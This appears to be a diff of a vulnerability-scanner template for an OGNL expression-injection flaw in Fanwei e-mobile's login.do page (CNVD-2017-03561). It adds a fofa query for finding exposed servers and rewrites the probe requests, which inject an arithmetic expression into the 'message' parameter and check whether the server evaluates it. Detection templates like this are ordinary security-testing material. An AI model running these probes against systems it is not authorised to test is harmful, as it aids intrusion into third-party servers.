@@ -8,25 +8,27 @@ info:
   description: |-
     e-mobile是泛微为手机、平板电脑等移动终端的移动办公产品。
     上海泛微网络科技股份有限公司e-mobile平台login.do页面存在表达式注入漏洞。允许攻击者远程执行命令，获得服务器权限。
-    app="泛微-EMobile"
+    fofa: app="泛微-EMobile"
   reference:
     - https://gitee.com/cute-guy/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md
     - https://zhuanlan.zhihu.com/p/26052235
     - https://www.cnvd.org.cn/flaw/show/CNVD-2017-03561
-  tags: emobile,ssti
+  tags: emobile,ssti,cnvd,cnvd2017
   created: 2020/09/11
 
 set:
-  numa: randomInt(1000, 5000)
-  numb: randomInt(5000, 10000)
-  x: numa * numb
+  n1: randomInt(1000, 5000)
+  n2: randomInt(5000, 10000)
+  result: n1 * n2
 rules:
   r0:
     request:
       method: GET
-      path: "/login.do?message={{numa * numb}}={{x}}"
-      headers:
-        a: "{{numa + numb}}"
-      body: "message={{randomInt(99999911, 99999999)}}={{randomLowercase(32)}}"
-    expression: response.status == 200 && response.body.bcontains(bytes(string(numa * numb)))
-expression: r0()
+      path: "/login.do?message={{n1}}*{{n2}}{{result}}"
+    expression: response.status == 200 && response.body.bcontains(bytes(string(result)))
+  r1:
+    request:
+      method: GET
+      path: "/login/login.do?message={{n1}}*{{n2}}"
+    expression: response.status == 200 && response.body.bcontains(bytes(string(result)))
+expression: r0() && r1()
